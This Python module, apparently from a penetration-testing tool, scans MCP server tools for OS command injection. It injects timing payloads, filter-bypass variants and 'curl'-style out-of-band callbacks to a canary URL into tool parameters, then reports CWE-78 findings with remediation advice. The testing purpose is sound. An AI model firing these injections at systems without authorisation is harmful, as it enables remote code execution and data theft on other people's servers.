"""
Command Injection (MCP, OS-command surface).

Method
------
For each MCP tool whose string parameters look like they might flow into
a shell/OS command, fire two classes of payloads:

1. Blind timing probes — baseline latency + injected sleep. If the
   delta is >= (sleep_seconds - tolerance), the underlying shell ran.

2. Out-of-band callback probes — inject `curl <canary>` style payloads.
   If the canary callback service records a hit from the target's IP,
   code execution is **confirmed** with side-channel proof.

Both classes survive sandboxing that suppresses output, which is common
in enterprise-grade MCP deployments.
"""

import time as _time


def execute(target, params, context):
    rb = evidence.ReportBuilder(
        attack_id=context.get("attack_id", "command_injection"),
        target=target,
    )
    timeout = int(params.get("timeout", 30))
    sleep_seconds = int(params.get("sleep_seconds", 8))
    timing_tolerance = float(params.get("timing_tolerance", 2.0))
    oob_wait_seconds = int(params.get("oob_wait_seconds", 20))
    max_tools = int(params.get("max_tools", 20))
    only_tool_names = params.get("only_tool_names") or []
    bypass_modes = params.get("bypass_modes") or ["ifs", "base64", "env"]
    windows_payloads = bool(params.get("windows_payloads", True))
    tool_keywords = params.get("tool_keywords") or list(_COMMAND_KEYWORDS)
    protocol_version = params.get("protocol_version") or None
    transport_override = params.get("transport_override") or None

    rb.info(f"Opening MCP session → {target.get('base_url') or target.get('host')}")
    mcp = mcp_client.MCPClient.from_target(
        target, timeout=timeout,
        protocol_version=protocol_version,
        force_transport=transport_override,
    )
    try:
        disc = mcp.discover()
        if not disc["initialized"]:
            rb.error("MCP initialize failed — target may not speak MCP here.")
            return rb.finalize(success=False)
        tools = disc.get("tools") or []
        rb.info(f"Tools discovered: {len(tools)}")

        # Only tools whose names/descriptions hint at shell/filesystem/command flow
        candidates = _pick_candidates(tools, only_tool_names, tool_keywords)[:max_tools]
        if not candidates:
            rb.warn("No plausible command-flow tools found. Use 'only_tool_names' to force.")
            return rb.finalize(success=True)

        posix_blind = payloads.get("command_injection:blind", limit=3) \
                      or payloads.get("blind", limit=3)
        posix_blind = [p for p in posix_blind if "timing" in (p.get("tags") or [])]
        win_blind = payloads.get("command_injection:blind", limit=6) if windows_payloads else []
        oob_set = payloads.get("command_injection:oob", limit=4) or \
                  payloads.get("oob", limit=4)
        # Pull encoding-bypass payloads when requested
        bypass_payloads: list = []
        if "ifs" in bypass_modes:
            bypass_payloads += payloads.get("command_injection:bypass", limit=3) or []
        if "base64" in bypass_modes:
            bypass_payloads += payloads.get("command_injection:obfuscated", limit=3) or []
        rb.info(f"Bypass modes: {bypass_modes} ({len(bypass_payloads)} payloads)")

        for tool in candidates:
            tname = tool.get("name")
            schema = tool.get("inputSchema") or {}
            str_params = _string_params(schema)
            if not str_params:
                continue

            baseline = _measure_baseline(mcp, tname, schema, str_params)
            rb.info(f"[{tname}] baseline latency ≈ {baseline:.2f}s")

            # --- Timing-based blind ----------------------------------------
            for param_name in str_params:
                for p in posix_blind + win_blind:
                    payload_str = str(p["content"]).replace(
                        "sleep 8", f"sleep {sleep_seconds}"
                    ).replace("timeout 8", f"timeout {sleep_seconds}")
                    args = _fill_defaults(schema)
                    base_val = args.get(param_name) or "test"
                    args[param_name] = f"{base_val}{payload_str}"

                    t0 = _time.time()
                    resp = mcp.call_tool_safe(tname, args)
                    dt = _time.time() - t0
                    rb.add_evidence(evidence.ev_mcp_call(
                        resp, note=f"timing probe {tname}[{param_name}] dt={dt:.2f}s"))

                    if dt - baseline >= (sleep_seconds - timing_tolerance):
                        rb.add_finding(_build_timing_finding(
                            tname, param_name, payload_str, baseline, dt,
                            context, target))

            # --- OOB callback ---------------------------------------------
            for param_name in str_params:
                for p in oob_set:
                    token = oob.mint(
                        attack_id="command_injection",
                        ttl=oob_wait_seconds + 30,
                        metadata={"tool": tname, "param": param_name},
                    )
                    tmpl = str(p["content"])
                    payload_str = (tmpl
                                   .replace("{OOB_URL}", token.url)
                                   .replace("{OOB_HOST}", _host_of(token.url)))
                    args = _fill_defaults(schema)
                    args[param_name] = f"{args.get(param_name) or 'test'}{payload_str}"

                    resp = mcp.call_tool_safe(tname, args)
                    rb.add_evidence(evidence.ev_mcp_call(
                        resp, note=f"oob probe {tname}[{param_name}]"))

                    hits = oob.wait(token.token, timeout=oob_wait_seconds)
                    if hits:
                        rb.add_finding(_build_oob_finding(
                            tname, param_name, payload_str, token, hits,
                            resp, context, target))
                        oob.release(token.token)
                        break  # confirmed once is enough per param
                    oob.release(token.token)

        return rb.finalize()
    finally:
        mcp.close()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_COMMAND_KEYWORDS = (
    "shell", "exec", "run", "command", "cmd", "bash", "system",
    "spawn", "proc", "ping", "nslookup", "dns", "network", "host",
    "file", "path", "read_file", "write_file", "rm", "ls", "find",
    "curl", "wget", "http", "fetch", "browse",
)


def _pick_candidates(tools, force_names, kw_override=None):
    if force_names:
        return [t for t in tools if t.get("name") in set(force_names)]
    kws = kw_override or _COMMAND_KEYWORDS
    out = []
    for t in tools:
        blob = f"{t.get('name','')} {t.get('description','')}".lower()
        if any(k in blob for k in kws):
            out.append(t)
    if out:
        return out
    # Fallback: only the first 3 tools with string args. Prevents
    # multi-hour runs against MCP servers (GitHub, etc.) whose tools
    # do not interact with shell / filesystem at all. Pentester can
    # opt into broader sweep via `only_tool_names` or `tool_keywords`.
    fallback = [t for t in tools
                if any((p or {}).get("type") == "string"
                       for p in ((t.get("inputSchema") or {}).get("properties") or {}).values())]
    return fallback[:3]


def _string_params(schema):
    props = (schema or {}).get("properties") or {}
    return [n for n, s in props.items()
            if isinstance(s, dict) and s.get("type") == "string"]


def _fill_defaults(schema):
    out = {}
    props = (schema or {}).get("properties") or {}
    required = set((schema or {}).get("required") or [])
    for name, spec in props.items():
        if name not in required:
            continue
        t = (spec or {}).get("type")
        out[name] = {"string": "test", "integer": 1, "number": 1,
                     "boolean": False, "array": [], "object": {}}.get(t, "")
    return out


def _measure_baseline(mcp, tname, schema, str_params):
    args = _fill_defaults(schema)
    for p in str_params:
        args.setdefault(p, "baseline")
    samples = []
    for _ in range(3):
        t0 = _time.time()
        mcp.call_tool_safe(tname, args)
        samples.append(_time.time() - t0)
    samples.sort()
    return samples[len(samples)//2]  # median


def _host_of(url):
    try:
        from urllib.parse import urlparse
        return urlparse(url).hostname or ""
    except Exception:
        return ""


def _build_timing_finding(tname, pname, payload_str, baseline, observed,
                          context, target):
    return evidence.Finding(
        attack_id=context.get("attack_id", "command_injection"),
        title=f"Blind command injection (timing) in '{tname}' / '{pname}'",
        category="command_injection",
        severity="critical",
        confidence="high",
        cwe="CWE-78",
        tool=tname,
        parameter=pname,
        payload=payload_str,
        description=(
            f"Baseline response time was {baseline:.2f}s; after injecting a "
            f"sleep payload, response took {observed:.2f}s. This delta is "
            "consistent with the underlying shell executing the payload. "
            "No output channel was required — this is blind RCE."
        ),
        impact=(
            "Attacker can execute arbitrary OS commands on the MCP host, "
            "leading to full server compromise, data exfiltration, "
            "lateral movement, and persistence."
        ),
        remediation=(
            "Never pass MCP tool arguments into shell commands. Use parametrised "
            "exec APIs (e.g. subprocess with a list + shell=False), strict "
            "allow-lists, and deny any characters outside expected domains."
        ),
        references=[
            "https://cwe.mitre.org/data/definitions/78.html",
            "https://owasp.org/www-community/attacks/Command_Injection",
        ],
    )


def _build_oob_finding(tname, pname, payload_str, token, hits, resp,
                       context, target):
    first = hits[0] if hits else {}
    return evidence.Finding(
        attack_id=context.get("attack_id", "command_injection"),
        title=f"Command injection CONFIRMED via OOB callback on '{tname}'",
        category="command_injection",
        severity="critical",
        confidence="confirmed",
        cwe="CWE-78",
        tool=tname,
        parameter=pname,
        payload=payload_str,
        description=(
            f"Payload triggered an out-of-band HTTP callback from "
            f"{first.get('source_ip','unknown')} at {first.get('iso')}. "
            "This proves the target executed the injected shell command. "
            "Proof-of-exploit (callback details) captured in evidence."
        ),
        impact=(
            "Full RCE on the MCP server. The callback traffic additionally "
            "confirms outbound-egress capability — suitable for data "
            "exfiltration and C2."
        ),
        remediation=(
            "See timing finding. Additionally, enforce strict egress filtering "
            "on the MCP host so a successful injection cannot reach arbitrary "
            "external URLs."
        ),
        references=[
            "https://cwe.mitre.org/data/definitions/78.html",
            "https://portswigger.net/research/out-of-band-application-security-testing",
        ],
        evidence=[
            evidence.ev_oob_hit(token.token, hits,
                                note="Proof of execution — target called our canary URL"),
            evidence.ev_mcp_call(resp, note="MCP response to injection payload"),
        ],
    )
